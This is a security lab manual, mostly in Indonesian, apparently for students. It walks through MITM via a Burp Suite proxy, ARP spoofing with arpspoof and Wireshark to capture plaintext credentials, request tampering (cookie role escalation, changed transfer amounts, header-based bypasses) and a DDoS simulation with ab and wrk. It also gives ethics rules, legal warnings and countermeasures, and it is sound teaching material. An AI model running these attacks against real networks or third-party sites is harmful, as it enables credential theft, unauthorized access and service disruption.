This lab successfully demonstrated:

✓ Practical MITM attack using Burp Suite proxy
✓ Traffic monitoring capabilities (Praktik 2)
✓ Response modification techniques (Praktik 3)
✓ Real-world attack scenarios
✓ Critical vulnerabilities in unencrypted communications

Key Learnings:
1. HTTP traffic is completely insecure and visible to attackers
2. MITM attacks are easy to perform with basic tools
3. Client cannot detect response modifications (transparent)
4. Encryption (HTTPS) is essential, not optional
5. Defense-in-depth approach required: HTTPS + VPN + education

Recommended Actions:
→ Deploy HTTPS everywhere
→ Implement strict security policies
→ Conduct security awareness training
→ Regular penetration testing
→ Monitor for suspicious proxy activity

═══════════════════════════════════════════════════════════════════
Report Prepared By: _______________________
Date: _______________________
Signature: _______________________
═══════════════════════════════════════════════════════════════════
```

---

## **KESIMPULAN PRAKTIK 2 & 3:**

| Aspek | Praktik 2 | Praktik 3 |
|-------|-----------|----------|
| **Tujuan** | Monitor traffic | Modify response |
| **Setup** | Intercept OFF | Intercept ON |
| **Method** | HTTP History | Match & Replace |
| **Attacker Visibility** | Credentials, URLs, cookies | Same + modify content |
| **Risk to Client** | Account breach | Malware injection |
| **Detection** | Difficult | Possible (if observant) |
| **Defense** | HTTPS + VPN | HTTPS + Certificate pinning |
| **Real-world Impact** | HIGH | CRITICAL |

**ALWAYS REMEMBER**: These attacks hanya efektif pada HTTP (unencrypted). HTTPS dengan valid certificate membuat MITM sangat sulit dilakukan!

#### **6E. Wireshark Security Insights (Educational)**

**What Attackers Can See with Network Access:**

```
✓ VISIBLE (not encrypted):
├─ DNS queries (websites visited)
├─ IP addresses (src/dst)
├─ Port numbers
├─ Email headers (if not TLS)
├─ Unencrypted HTTP traffic
├─ FTP passwords (plain text!)
├─ Telnet passwords (plain text!)
├─ ARP traffic
└─ Network topology

✗ NOT VISIBLE (encrypted):
├─ HTTPS traffic content (encrypted TLS)
├─ Email body (if TLS enabled)
├─ VPN traffic (encrypted tunnel)
├─ SSH traffic (encrypted)
└─ Encrypted messaging (Signal, WhatsApp)

KEY LEARNING:
⚠️ Even without seeing encrypted content,
   Attackers can learn WHAT services you use
   by monitoring: DNS queries, port connections, data volume
```

**Conclusion - Why This Matters:**
```
Wireshark demonstrates importance of:
1. Using HTTPS for all websites
2. DNS-over-HTTPS (DoH) for privacy
3. VPN for public WiFi protection
4. SSH instead of Telnet
5. Email encryption (S/MIME, PGP)
6. Network segmentation
```

---

###8.2 Praktik 2: Burp Suite Proxy - Interception & Modification

#### **Tujuan:**
Menggunakan Burp Suite sebagai proxy untuk intercept, inspect, dan modify HTTP/HTTPS traffic.

#### **Setup Architecture:**
```
┌──────────────────────────────────────────────────┐
│              BURP SUITE PROXY LAB                 │
└──────────────────────────────────────────────────┘

SCENARIO: Windows Hotspot dengan Burp Suite Proxy

┌─────────────────────────┐
│  Windows PC (Attacker)  │
│ IP: 192.168.137.1       │
│                         │
│ Burp Suite Running      │
│ Proxy: 127.0.0.1:8080  │
│                         │
│ Wi-Fi Hotspot ON        │
│ Hotspot SSID: "Lab"     │
│ Hotspot Pass: "123456"  │
└──────────┬──────────────┘
           │ Wi-Fi Hotspot
    ┌──────┴──────┐
    │             │
┌───▼────────┐  ┌─▼──────────┐
│  Phone     │  │  Laptop    │
│ Connected  │  │ Connected  │
│ to Hotspot │  │ to Hotspot │
└───┬────────┘  └─┬──────────┘
    │             │
    └─────┬───────┘
          │ Traffic routes through PC
    ┌─────▼─────────────────┐
    │ Burp Suite Proxy      │
    │ (Intercept & Modify)  │
    │ All HTTP traffic seen!│
    └───────────────────────┘
```

#### **Praktik Step-by-Step:**

**STEP 1: Install & Configure Burp Suite**
```
1. Download: https://portswigger.net/burp/communitydownload
2. Install Burp Suite Community Edition
3. Launch Burp Suite
4. Go to Proxy → Options
5. Note Proxy Address: 127.0.0.1:8080
```

**STEP 2: Enable Windows Hotspot**
```
Windows 10/11:
Settings → Network & Internet → Mobile hotspot
├─ Turn on "Mobile hotspot"
├─ Edit → SSID: "Lab"
├─ Edit → Password: "123456"
├─ Internet connection to share: [Your internet]
└─ Connected devices: 0

Status: HOTSPOT ACTIVE
```

**STEP 3: Configure Client Device to Use Burp Proxy**

**On Mobile Phone / Laptop:**
```
Wi-Fi Settings:
1. Connect to "Lab" hotspot (192.168.137.1)
2. Enter password: "123456"
3. Advanced Settings / Proxy
   ├─ Proxy Type: Manual
   ├─ Proxy Server: 192.168.137.1
   ├─ Proxy Port: 8080
   └─ Save

Browser Settings (Alternative):
HTTP Proxy: 192.168.137.1:8080
HTTPS Proxy: 192.168.137.1:8080
```

**STEP 4: Verify Proxy Connection**
```
On Attacker PC (Burp Suite):
Proxy → HTTP History

When client opens browser:
✓ You should see HTTP requests appearing in history!
```

**STEP 5: Intercept Traffic**
```
Burp Suite:
Proxy → Intercept
├─ Turn ON "Intercept is on"
└─ Now all requests will pause for inspection

Client Device:
1. Open browser
2. Visit: http://example.com
3. Page loading... STUCK (intercepted by Burp)

Burp Suite:
Proxy → Intercept tab:
┌──────────────────────────────────┐
│ GET / HTTP/1.1                   │
│ Host: example.com                │
│ User-Agent: Mozilla/5.0...       │
│ Cookie: sessionid=abc123...      │
│ ...                              │
│                                  │
│ [Forward] [Drop] [Interc. Response] │
└──────────────────────────────────┘
```

**STEP 6: Modify Intercepted Traffic**

**Example 1: Modify Cookie**
```
INTERCEPTED REQUEST:
GET /dashboard HTTP/1.1
Host: bank.lab.local
Cookie: role=user; sessionid=xyz789

MODIFY TO:
GET /dashboard HTTP/1.1
Host: bank.lab.local
Cookie: role=ADMIN; sessionid=xyz789
        ↑ Changed from "user" to "ADMIN"

CLICK: [Forward]
Result: Possibly unauthorized access!
```

**Example 2: Modify POST Data**
```
INTERCEPTED POST:
POST /transfer HTTP/1.1
Host: bank.lab.local
Content-Length: 35

amount=100&recipient=attacker@bank

MODIFY TO:
POST /transfer HTTP/1.1
Host: bank.lab.local
Content-Length: 38

amount=10000&recipient=attacker@bank
      ↑ Changed 100 to 10000

CLICK: [Forward]
Result: Transfer amount modified!
```

**Example 3: Add Malicious Header**
```
ORIGINAL:
GET /login HTTP/1.1
Host: app.lab
Authorization: Bearer token123

MODIFIED:
GET /login HTTP/1.1
Host: app.lab
Authorization: Bearer token123
X-Forwarded-For: 10.0.0.1         ← ADD THIS
X-Original-URL: /admin             ← ADD THIS

Result: Potential bypass of IP restrictions or URL validation!
```

#### **Lab Findings Template:**
```
BURP SUITE INTERCEPT LAB RESULTS:

1. UNENCRYPTED HTTP TRAFFIC FOUND:
   ├─ Website: ______________
   ├─ Sensitive Data: ________
   └─ Risk: HIGH

2. COOKIES INTERCEPTED:
   ├─ Session Cookie: _______
   ├─ Authentication Token: _
   └─ Suggestion: Use HTTPS!

3. SUCCESSFUL MODIFICATIONS:
   ├─ Request 1: ___________
   ├─ Result: ______________
   └─ Security Implication: _

4. RECOMMENDATIONS:
   • All HTTP should be HTTPS
   • Implement CSRF tokens
   • Validate input on server
   • Use security headers
```

---

### 8.3 Praktik 3: Man-in-the-Middle (MITM) Attack - ARP Spoofing

#### **Penjelasan Sederhana MITM:**

**Bayangan surat lagi:**
```
NORMAL (AMAN):
┌───────┐      Surat      ┌──────────┐
│ Anda  │ ──────────────→ │ Teman    │
└───────┘                 └──────────┘
Surat sampai langsung ke teman

MITM ATTACK (BAHAYA):
┌───────┐     ┌─────────┐      ┌──────────┐
│ Anda  │────→│ Jahat   │────→ │ Teman    │
└───────┘     │ (Baca   │      └──────────┘
              │  & Ubah)│
              └─────────┘
Surat harus lewat jahat dulu!
Jahat bisa:
✓ BACA isinya
✓ COPY isinya
✓ UBAH isinya
✓ Teman tidak tahu
```

#### **SETUP UNTUK PRAKTIK - 3 KOMPUTER MINIMAL**

**Komputer yang Dibutuhkan:**

```
KOMPUTER 1 (CLIENT/KORBAN):
├─ Nama: "Laptop Korban"
├─ IP Address: 192.168.1.100 (contoh)
├─ Tugas: Browsing website normal
├─ Tidak tahu sedang di-MITM
└─ Contoh: Bisa pakai laptop teman

KOMPUTER 2 (ATTACKER/ANDA):
├─ Nama: "Laptop Hacker" (PC Anda)
├─ IP Address: 192.168.1.50 (contoh)
├─ OS: Linux (Ubuntu / Kali recommended)
├─ Tugas: Jalankan attack
└─ Tools yang diperlukan:
   ├─ Wireshark (capture traffic)
   ├─ Arpspoof (MITM tool)
   └─ Terminal/CLI

KOMPUTER 3 (GATEWAY/ROUTER):
├─ Nama: "WiFi Router"
├─ IP Address: 192.168.1.1 (GATEWAY)
├─ Tugas: Gateway ke internet
└─ Catatan: Bisa juga gateway virtual di laptop
```

**Kondisi PENTING:**
```
⚠️ SEMUA 3 KOMPUTER HARUS DI JARINGAN YANG SAMA!
└─ Contoh: Semua terhubung ke WiFi "MyNetwork"
└─ BUKAN hotspot dari attacker (itu Praktik 2)
```

---

#### **STEP 1: PERSIAPAN - INSTALL TOOLS DI LINUX**

**Buka Terminal & Ketik (copy-paste):**

```bash
# Update system dulu
sudo apt update

# Install Wireshark
sudo apt install -y wireshark

# Install arpspoof (bagian dari dsniff)
sudo apt install -y dsniff

# Verifikasi instalasi berhasil:
which arpspoof
which wireshark

# Output harus menunjukkan path (bukan kosong)
```

**Jika sudah terinstall, output akan seperti ini:**
```
/usr/sbin/arpspoof
/usr/bin/wireshark
```

---

#### **STEP 2: CARI INFORMASI JARINGAN**

**Buka Terminal & Ketik:**

```bash
# Lihat IP address komputer Anda sendiri:
ifconfig

# atau di Linux modern:
ip addr show
```

**Cari informasi penting - TULIS DI KERTAS:**
```
DARI OUTPUT, CARI BAGIAN INI:

inet 192.168.1.50       ← IP ANDA (ATTACKER)
inet 192.168.1.100      ← IP KORBAN (CLIENT)
inet 192.168.1.1        ← IP GATEWAY (ROUTER)

Interface network: eth0 atau wlan0 ← NAMA INTERFACE

CONTOH OUTPUT:
───────────────────────────────────────
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.50  netmask 255.255.255.0  broadcast 192.168.1.255
        ether aa:bb:cc:dd:ee:ff  txqueuelen 1000
───────────────────────────────────────

CATAT:
IP Attacker = 192.168.1.50 ← PUNYA ANDA
Interface = eth0 ← NETWORK CARD ANDA
Gateway = 192.168.1.1 ← ROUTER
Client/Korban = 192.168.1.100 ← KOMPUTER LAIN
```

**Cara Cari IP Korban:**

```bash
# Lihat siapa saja yang connect di network:
arp-scan -l

OUTPUT CONTOH:
───────────────────────────────────────
Interface: eth0, datalink type: EN10MB
Starting arp-scan 1.9.7 with 256 hosts
192.168.1.1   aa:bb:cc:dd:ee:01   Gateway Router
192.168.1.50  aa:bb:cc:dd:ee:02   My Computer (Attacker)
192.168.1.100 ff:11:22:33:44:55   Client Laptop ← INI KORBAN!
───────────────────────────────────────

IP Korban = 192.168.1.100
MAC Address = ff:11:22:33:44:55
```

---

#### **STEP 3: BUKA WIRESHARK & SIAP CAPTURE**

**Langkah-langkah Membuka Wireshark:**

```
1. BUKA TERMINAL
2. Ketik perintah:
   sudo wireshark &
   
3. Tekan ENTER
4. Tunggu 3-5 detik
5. Window Wireshark akan terbuka
```

**SETELAH WIRESHARK TERBUKA - APA YANG ANDA LIHAT:**

```
┌─────────────────────────────────────────────┐
│ Wireshark - Network Protocol Analyzer       │ ← Title bar
├─────────────────────────────────────────────┤
│ File Edit View Capture Analyze Tools Help   │ ← Menu bar
├─────────────────────────────────────────────┤
│ ◀ ▶ ■(Stop) ⚙ ↻ 🔍 ...                   │ ← Toolbar
├─────────────────────────────────────────────┤
│ Capture interfaces:                         │ ← Mulai bagian penting
│                                             │
│ ☑ eth0 (Ethernet)         ← CLICK INI!     │
│ ☑ lo (Loopback)          ← Abaikan         │
│ ☑ wlan0 (WiFi)           ← Bisa juga       │
│                                             │
│ ◀  ▶  ⏺  ⚙  ...                           │ ← Tombol
└─────────────────────────────────────────────┘
```

**PILIH INTERFACE:**

```
Lihat di bagian tengah ada daftar interface:

1. Cari interface yang ACTIVE (punya traffic):
   ├─ eth0 = Kabel ethernet
   ├─ wlan0 = WiFi
   └─ Pilih yang sesuai dengan koneksi Anda

2. DOUBLE-CLICK nama interface
   Contoh: double-click "eth0"

3. Wireshark akan berubah tampilan:
   ┌──────────────────────────────────────────┐
   │ Capturing from eth0...                   │
   │                                          │
   │ ◼ STOP CAPTURE                          │ ← Tombol merah
   │                                          │
   │ Packets: 0 (0.0 MB)                      │
   └──────────────────────────────────────────┘

4. BIARKAN WIRESHARK CAPTURE
   (Jangan close dulu)
```

---

#### **STEP 4: JALANKAN ARP SPOOFING ATTACK (TERMINAL BARU)**

**BUKA TERMINAL BARU (Jangan tutup terminal Wireshark):**

```bash
# Perintah 1: Spoofing CLIENT
# Ubah: IP korban & IP gateway sesuai informasi Anda!

sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Penjelasan:
# -i eth0                = Interface yang dipakai
# -t 192.168.1.100      = Target (KORBAN) IP
#    192.168.1.1        = Gateway IP
```

**OUTPUT YANG AKAN MUNCUL:**
```
SENT 2 probes (1 broadcast(s))
Unicasting replies to 192.168.1.100
SENT 9 probes (8 broadcast(s))
...
```

**BERARTI: Arpspoof sedang berjalan! ✓**

---

#### **STEP 5: BUKA TERMINAL KETIGA - ARP SPOOFING REVERSE**

**BUKA TERMINAL KETIGA:**

```bash
# Perintah 2: Spoofing GATEWAY
# Ubah: IP gateway & IP korban sesuai informasi!

sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Penjelasan:
# KALI INI kebalikan!
# -t 192.168.1.1       = Target GATEWAY
#   192.168.1.100      = CLIENT IP
```

**OUTPUT YANG AKAN MUNCUL:**
```
SENT 2 probes (1 broadcast(s))
Unicasting replies to 192.168.1.1
...
```

**SEKARANG ANDA PUNYA 3 TERMINAL TERBUKA:**
```
Terminal 1: Wireshark (buka pane besar)
Terminal 2: Arpspoof (spoofing client) - berjalan
Terminal 3: Arpspoof (spoofing gateway) - berjalan
```

---

#### **STEP 6: LIHAT WIRESHARK MULAI CAPTURE DATA**

**KEMBALI KE WIRESHARK (Yang sudah dibuka Step 3):**

**APA YANG HARUS TERJADI:**

```
Sebelum MITM:
┌────────────────────────────────────────┐
│ Packets: 0 (0.0 MB)                    │
│ Capturing from eth0...                 │
└────────────────────────────────────────┘

Sesudah ARP Spoofing Dijalankan:
┌────────────────────────────────────────┐
│ Packets: 1234 (3.5 MB)                │ ← Mulai bertambah!
│ Capturing from eth0...                 │
│                                        │
│ No.  Time        Source    Dest   ... │ ← Paket mulai muncul
│ 1    0.001234    192...    192... ... │
│ 2    0.001456    192...    192... ... │
│ 3    0.002789    192...    192... ... │
│ ...                                    │
└────────────────────────────────────────┘
```

**JIKA PAKET TIDAK BERTAMBAH = ERROR**
```
Troubleshoot:
├─ Cek IP address benar?
├─ Cek interface benar (eth0 vs wlan0)?
├─ Cek arpspoof sudah jalan (lihat terminal)?
└─ Cek korban benar-benar browsing?
```

---

#### **STEP 7: LIHAT DATA YANG TERTANGKAP**

**DI WIRESHARK - LIHAT PACKET LIST (TOP):**

```
Klik pada paket HTTP (jika ada):
- Cari "HTTP" di kolom "Protocol"
- Atau "GET" di kolom "Info"
```

**SETELAH CLICK PAKET:**

```
Wireshark akan menampilkan 3 bagian:

BAGIAN 1 (TOP): Daftar Paket
┌─────────────────────────────────────┐
│ No. │ Source    │ Dest      │ Proto │
├─────┼───────────┼───────────┼───────┤
│ 42  │ 192.168.. │ 192.168.. │ HTTP  │ ← CLICK INI
└─────────────────────────────────────┘

BAGIAN 2 (MIDDLE): Detail Paket
┌──────────────────────────────────────┐
│ ▶ Frame                              │
│ ▶ Ethernet II                        │
│ ▶ Internet Protocol Version 4        │
│ ▶ Transmission Control Protocol      │
│ ▶ HyperText Transfer Protocol        │ ← EXPAND INI
│   ├─ GET /                           │
│   ├─ Host: example.com               │
│   ├─ User-Agent: Mozilla             │
│   └─ Cookie: sessionid=abc...        │ ← DATA!
└──────────────────────────────────────┘

BAGIAN 3 (BOTTOM): Raw Data (Hex)
┌──────────────────────────────────────┐
│ 4745 5420 2f20 4854 5450 2f31 2e31  │ ← Abaikan
│ 0d0a 486f 7374 3a20 6578 616d ...   │
└──────────────────────────────────────┘
```

---

#### **STEP 8: EXTRACT CREDENTIALS (JIKA ADA)**

**PADA KORBAN - BUAT DIA BROWSING HTTP WEBSITE DENGAN LOGIN:**

```
Minta korban untuk:
1. Buka browser
2. Cari website HTTP (bukan HTTPS) dengan login
   Contoh: http://testphp.vulnweb.com
3. Login dengan username & password apapun
4. Kirim form
```

**DI WIRESHARK - LIHAT DATA:**

```
Filter: http.request.method == "POST"
(Ini untuk lihat hanya form submission)

Output akan menunjukkan:
┌──────────────────────────────────────────────┐
│ POST /login HTTP/1.1                         │
│ Host: testphp.vulnweb.com                    │
│ Content-Type: application/x-www-form-...    │
│ Content-Length: 32                           │
│                                              │
│ username=john&password=MyPassword123         │
│           ↑                     ↑             │
│       CAPTURED!           CAPTURED!          │
└──────────────────────────────────────────────┘
```

**KESIMPULAN:**
```
✓ Anda sudah melihat:
  ├─ Username: john
  ├─ Password: MyPassword123
  ├─ Website: testphp.vulnweb.com
  └─ Semuanya PLAINTEXT (tidak enkripsi)

✓ Sekarang Anda bisa login dengan credentials itu!
```

---

#### **STEP 9: HENTIKAN ATTACK**

**JIKA SUDAH SELESAI - TEKAN Ctrl+C PADA SEMUA TERMINAL:**

```
Terminal 1 (Wireshark):
- Menu: Capture → Stop
- Atau: Click tombol Stop (square merah)

Terminal 2 (Arpspoof #1):
- Tekan: Ctrl+C

Terminal 3 (Arpspoof #2):
- Tekan: Ctrl+C

Result:
```
ATTACK STOPPED
Korban network kembali normal
```
```

---

#### **STEP 10: SAVE CAPTURE & ANALISIS NANTI**

**DI WIRESHARK - SIMPAN DATA:**

```
Menu: File → Save As

Akan muncul dialog:
┌──────────────────────────────────────┐
│ Save file as:                        │
│                                      │
│ Filename: [untitled-000]             │ ← Edit nama
│ Type: Wireshark pcapng (*.pcapng)    │
│ Location: /home/user/Documents       │
│                                      │
│ [Save] [Cancel]                      │
└──────────────────────────────────────┘

Ubah filename menjadi: MITM_Attack_2025

Klik: [Save]
```

---

#### **TABEL PERBANDINGAN: PRAKTIK 2 vs PRAKTIK 3**

```
┌──────────────────┬──────────────────────┬──────────────────────┐
│ ASPEK            │ PRAKTIK 2             │ PRAKTIK 3            │
│                  │ (BURP PROXY)          │ (ARP SPOOFING)       │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Cara Kerja       │ Korban config proxy   │ Attacker: network    │
│                  │ manual ke attacker    │ "jadi" gateway       │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Setup            │ Perlu hotspot         │ Perlu network biasa  │
│                  │ Perlu PAC server      │ (WiFi/LAN punya      │
│                  │ Perlu Burp Suite      │ gateway)             │
│                  │                       │ Perlu Arpspoof       │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Deteksi          │ Mudah (proxy visible) │ Sulit (transparent)  │
│ Oleh Korban       │                       │                      │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Kemampuan        │ Intercept & modify    │ Hanya capture        │
│                  │ response              │ (tidak modify)       │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Real-world       │ Coffee shop attacker  │ Network admin        │
│ Scenario         │ (share hotspot)       │ (control router)     │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Kesulitan        │ MUDAH                 │ SULIT (butuh Linux)  │
│ Implementasi     │ (Bisa di Windows)     │                      │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Pembelajaran     │ Understanding proxy   │ Understanding ARP    │
│                  │ & MITM concept        │ & layer 2 attacks    │
└──────────────────┴──────────────────────┴──────────────────────┘
```

---

#### **CHECKLIST - PRAKTIK 3 BERHASIL?**

```
✓ Sudah install tools (wireshark, arpspoof)?
✓ Sudah catat IP address (attacker, client, gateway)?
✓ Sudah buka Wireshark & pilih interface?
✓ Sudah jalankan 2x arpspoof di 2 terminal?
✓ Sudah lihat paket masuk di Wireshark?
✓ Sudah lihat username/password di captured paket?
✓ Sudah save capture file?

JA semua = PRAKTIK 3 BERHASIL! ✓
TIDAK semua = Cek troubleshooting di atas
```

#### **MITM Lab Report:**
```
MAN-IN-THE-MIDDLE ATTACK RESULTS:

ATTACK SETUP:
├─ Attacker IP: 192.168.1.50
├─ Victim IP: 192.168.1.100
├─ Gateway IP: 192.168.1.1
└─ Attack Duration: _______ minutes

TRAFFIC CAPTURED:
Total Packets: __________
HTTP Packets: __________
HTTPS Packets: __________

CREDENTIALS CAPTURED:
Username: ________
Password: ________
Website: ________

UNENCRYPTED DATA:
├─ Email contents: _______
├─ Chat messages: _______
├─ Form submissions: ____
└─ Cookies: __________

ATTACK DEMONSTRATION:
1. ARP Spoofing enabled: YES / NO
2. IP Forwarding enabled: YES / NO
3. Traffic visible: YES / NO
4. Credentials stolen: YES / NO

KEY FINDINGS:
• HTTP traffic is completely vulnerable
• HTTPS encrypts content (good!)
• Cookies transmitted without protection
• Need for security awareness training

COUNTERMEASURES LEARNED:
1. Use HTTPS everywhere
2. HSTS (HTTP Strict Transport Security)
3. Certificate pinning
4. Network monitoring for ARP spoofing
5. VPN encryption
```

---

### 7.4 Security Lab Safety Guidelines

⚠️ **CRITICAL RULES:**

```
┌─────────────────────────────────────────┐
│     ETHICAL HACKING LAB RULES            │
└─────────────────────────────────────────┘

✓ DO:
├─ Only attack machines you own/have permission
├─ Use isolated lab networks
├─ Document all activities
├─ Get written permission from network owner
├─ Use tools responsibly & legally
├─ Report findings to appropriate parties
└─ Learn from results

✗ DON'T:
├─ Attack real production networks
├─ Attack networks without written permission
├─ Attempt to access data you're not authorized to see
├─ Modify or delete data on target systems
├─ Use attacks for personal gain/fraud
├─ Publicly disclose vulnerabilities without responsible disclosure
├─ Leave backdoors/malware on systems
└─ Damage systems or data

LEGAL CONSEQUENCES:
If you attack network without authorization:
├─ Criminal charges (CFAA - Computer Fraud & Abuse Act)
├─ Civil lawsuits
├─ Imprisonment up to 10+ years
├─ Fines up to $250,000+
└─ Permanent criminal record

ETHICAL HACKING CERTIFIED PATHS:
├─ CEH (Certified Ethical Hacker) - EC-Council
├─ OSCP (Offensive Security Certified Professional)
├─ Security+, CISSP - CompTIA/ISC²
└─ HackerOne, BugBounty Programs (Legal bug hunting)
```

---

---

### 8.4 Tugas 4: Simulasi DDoS Attack Menggunakan Tools (ApacheBench & wrk)

#### **Penjelasan Sederhana DDoS:**

**Bayangan Restoran:**
```
NORMAL (Restoran Sepi):
Pelayan: 10 orang
Pelanggan: 5 orang
Pelayanan: Cepat, lancar

DDoS ATTACK (Serangan Spam):
Pelayan: 10 orang (tetap)
"Pelanggan": 10,000 orang sekaligus
├─ 5 pelanggan asli
├─ 9,995 orang spam yang buru-buru keluar
Hasil:
├─ Pelayan kewalahan
├─ Pelanggan asli tidak dilayani
├─ Restoran crash
└─ Semua orang pulang

ANALOGI HTTP:
Server = Restoran
Request = Pelanggan
DDoS = Banjir request palsu
Result = Server tidak bisa layani pelanggan asli
```

---

#### **JENIS-JENIS DDOS TOOLS:**

```
TOOLS POPULER:

1. ApacheBench (ab)
   ├─ Cara pakai: MUDAH (1 baris command)
   ├─ Kecepatan: Lambat (sequential)
   ├─ Cocok untuk: Testing lokal/lab
   └─ Instalasi: Sudah ada di Ubuntu

2. WRK (Wrk Benchmark Tool)
   ├─ Cara pakai: MUDAH
   ├─ Kecepatan: CEPAT (multi-thread)
   ├─ Cocok untuk: Testing lokal/lab
   └─ Instalasi: Perlu download

3. Hping3
   ├─ Cara pakai: Medium (TCP/UDP/ICMP)
   ├─ Kecepatan: Sangat cepat
   ├─ Cocok untuk: Packet-level attack
   └─ Instalasi: apt install hping3

4. Slowhttptest
   ├─ Cara pakai: Kompleks
   ├─ Tipe: Slow attack (membuat koneksi lambat)
   ├─ Cocok untuk: Testing slow DDoS
   └─ Instalasi: Compile dari source

UNTUK PRAKTEK INI, KAMI PAKAI:
- ApacheBench (Mudah, cepat dipelajari)
- WRK (Modern, fast, mirip real attack)
```

---

#### **SETUP & INSTALASI**

**BUKA TERMINAL & INSTALL TOOLS:**

```bash
# Update package list
sudo apt update

# Install ApacheBench (ab)
sudo apt install -y apache2-utils

# Verifikasi instalasi
ab -h

# Output harus menunjukkan help menu ApacheBench
```

**INSTALL WRK (Jika ingin lebih advanced):**

```bash
# Install dependencies
sudo apt install -y git build-essential libssl-dev

# Clone WRK repository
git clone https://github.com/wg/wrk.git
cd wrk

# Compile WRK
make

# Verifikasi
./wrk --help
```

---

#### **PRAKTIK 4A: DDOS MENGGUNAKAN APACHE BENCH (MUDAH)**

**STEP 1: SIAPKAN TARGET WEBSITE**

```
Anda memerlukan website yang bisa di-attack.
Opsi:

OPSI 1: Website lokal (Paling aman untuk praktik)
Buka terminal baru:
$ python3 -m http.server 8080

Output:
Serving HTTP on 0.0.0.0 port 8080

Jangan close terminal ini!

OPSI 2: Website online yang siap di-test:
- httpbin.org
- example.com
- petstore.swagger.io

⚠️ JANGAN attack website orang tanpa permission!
   (Illegal!)
```

**STEP 2: BUKA TERMINAL BARU**

```
(Jangan tutup terminal website lokal)

Terminal baru:
$ cd ~/

Siap untuk test
```

**STEP 3: JALANKAN APACHE BENCH - REQUEST NORMAL**

```bash
# Test NORMAL (contoh):
ab -n 100 -c 10 http://localhost:8080/

# Penjelasan:
# -n 100  = Total request (100 kali)
# -c 10   = Concurrent (10 request bersamaan)
# URL     = Target website
```

**OUTPUT YANG AKAN MUNCUL:**

```
This is ApacheBench, Version 2.3
Benchmarking localhost (be patient)
Completed 10 requests
Completed 20 requests
Completed 30 requests
...
Completed 100 requests

Finished 100 requests

Server Software:        SimpleHTTP/0.6
Server Hostname:        localhost
Server Port:            8080

Document Path:          /
Document Length:        615 bytes

Concurrency Level:      10
Time taken for tests:   0.234 seconds
Complete requests:      100
Failed requests:        0
Requests per second:    427.35 [#/sec]
Time per request:       23.394 [ms]
Time per request:       2.339 [ms] (mean, across all concurrent requests)
Transfer rate:          901.16 [Kbytes/sec received]

Connection Times (ms)
              min  mean[+/-sd] median   max
Connect:        1    5   2.1      5      10
Processing:     3   15   4.2     14      28
Waiting:        2   10   3.1      9      24
Total:          6   20   5.0     19      38
```

**ANALISIS OUTPUT:**
```
Requests per second: 427.35 ← Server BISA handle 427 request/detik
Failed requests: 0 ← Semua request berhasil
Time taken: 0.234 seconds ← Cepat
```

---

**STEP 4: JALANKAN DDOS - DENGAN JUMLAH BESAR**

```bash
# DDoS Attack (SIMULASI):
ab -n 10000 -c 100 http://localhost:8080/

# Penjelasan:
# -n 10000 = 10,000 total request (BANYAK!)
# -c 100   = 100 concurrent (100 bersamaan)
# Server akan KEWALAHAN
```

**YANG TERJADI:**

```
SAAT BERJALAN:
Completed 100 requests
Completed 200 requests
Completed 300 requests
...

JIKA SERVER CRASH, OUTPUT:
WARNING: aproc.c:242: apr_socket_recv: Connection reset by peer (104)
Failed requests:  X
Broken pipe:      Y

KESIMPULAN:
✓ Server tidak bisa handle 10,000 request
✓ Beberapa request gagal
✓ Inilah DDoS attack!
```

---

**STEP 5: MONITORING SERVER SAAT ATTACK**

**BUKA TERMINAL KETIGA (JANGAN TUTUP YANG LAIN):**

```bash
# Monitor resource server
top

# Atau lebih detail:
htop

# Output akan menunjukkan:
- CPU usage naik drastis
- Memory naik
- Load average tinggi
- Process "python3" atau "http.server" dominan
```

**LIHAT DI TOP:**
```
top - 14:25:30 up 1:23, 1 user, load average: 9.82, 5.23, 2.14
Tasks: 45 total, 2 running, 43 sleeping

PID   USER  PR  NI  VIRT  RES  SHR  S  %CPU %MEM COMMAND
1234  user  20   0  45M  8.5M 5.2M S  89.5  2.1 python3 -m http.server
5678  user  20   0  2.1G 234M 180M S  12.3  8.9 ab -n 10000 -c 100

Load average: 9.82 ← Sangat tinggi (normal = 1-2)
```

---

#### **PRAKTIK 4B: DDOS MENGGUNAKAN WRK (LEBIH MODERN)**

**STEP 1: SETUP SEPERTI SEBELUMNYA**

```bash
# Terminal 1: Jalankan website lokal
python3 -m http.server 8080

# Terminal 2: Buka baru
cd ~/wrk
```

**STEP 2: JALANKAN WRK - NORMAL**

```bash
# Test NORMAL:
./wrk -t4 -c100 -d10s http://localhost:8080/

# Penjelasan:
# -t4     = 4 threads (4 "pekerja")
# -c100   = 100 connections (concurrent)
# -d10s   = 10 seconds duration
# URL     = Target
```

**OUTPUT WRK:**

```
Running 10s test @ http://localhost:8080/
  4 threads and 100 connections
  Thread Stats   Avg      Stdev    Max
    Latency    23.45ms   12.34ms  234.50ms
    Req/Sec    2389.23    456.78   3456.00

  95483 requests in 10.05s, 58.23MB read
Requests/sec:   9499.30
Transfer/sec:    5.79MB
```

**ANALISIS:**
```
Requests/sec: 9499.30 ← WRK bisa kirim 9,499 request/detik
Total requests: 95,483 ← Dalam 10 detik
Transfer: 58.23MB ← Banyak data
```

---

**STEP 3: ATTACK DENGAN WRK - INTENSITAS TINGGI**

```bash
# DDoS dengan WRK (LEBIH KUAT):
./wrk -t8 -c500 -d30s http://localhost:8080/

# Penjelasan:
# -t8     = 8 threads (lebih banyak)
# -c500   = 500 connections (banyak!)
# -d30s   = 30 seconds
# Server akan sangat overwhelmed
```

**HASIL:**

```
Server akan mulai:
- Response time naik drastis
- Requests failed: naik
- Load average: 50+
- Browser akses normal: SANGAT LAMBAT atau TIMEOUT
```

---

#### **ANALISIS SERANGAN DDOS**

**PERBEDAAN ApacheBench vs WRK:**

```
┌──────────────────┬──────────────────────┬──────────────────────┐
│ ASPEK            │ ApacheBench (ab)     │ WRK                  │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Kecepatan        │ Lambat (sequential)  │ Cepat (multi-thread) │
│                  │ ~400 req/sec         │ ~9000 req/sec        │
